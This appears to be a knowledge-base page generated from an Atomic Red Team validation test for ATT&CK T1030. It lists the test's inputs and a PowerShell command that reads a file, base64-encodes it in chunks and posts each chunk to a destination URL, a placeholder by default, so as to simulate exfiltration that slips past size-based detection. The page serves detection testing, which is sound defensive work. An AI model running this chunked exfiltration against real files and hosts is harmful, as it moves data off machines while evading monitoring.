---
atomic_guid: "f0287b58-f4bc-40f6-87eb-692e126e7f8f"
title: "Network-Based Data Transfer in Small Chunks"
framework: "atomic"
generated: "true"
attack_technique_id: "T1030"
attack_technique_name: "Data Transfer Size Limits"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1030/T1030.yaml"
build_date: "2026-04-27 19:12:25"
executor: "powershell"
aliases:
  - "f0287b58-f4bc-40f6-87eb-692e126e7f8f"
  - "Network-Based Data Transfer in Small Chunks"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Simulate transferring data over a network in small chunks to evade detection.

## ATT&CK Mapping

- [[kb/attack/techniques/T1030-data_transfer_size_limits|T1030: Data Transfer Size Limits]]

## Input Arguments

### chunk_size

- description: Size of each data chunk (in KB).
- type: integer
- default: 1024

### destination_url

- description: URL of the destination server.
- type: url
- default: http://example.com

### source_file_path

- description: Path to the source file to transfer.
- type: path
- default: [User specified]

## Executor

- elevation_required: False
- name: powershell

### Command

```powershell
$file = [System.IO.File]::OpenRead(#{source_file_path})
$chunkSize = #{chunk_size} * 1KB
$buffer = New-Object Byte[] $chunkSize

while ($bytesRead = $file.Read($buffer, 0, $buffer.Length)) {
    $encodedChunk = [Convert]::ToBase64String($buffer, 0, $bytesRead)
    Invoke-WebRequest -Uri #{destination_url} -Method Post -Body $encodedChunk
}
$file.Close()
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1030/T1030.yaml)
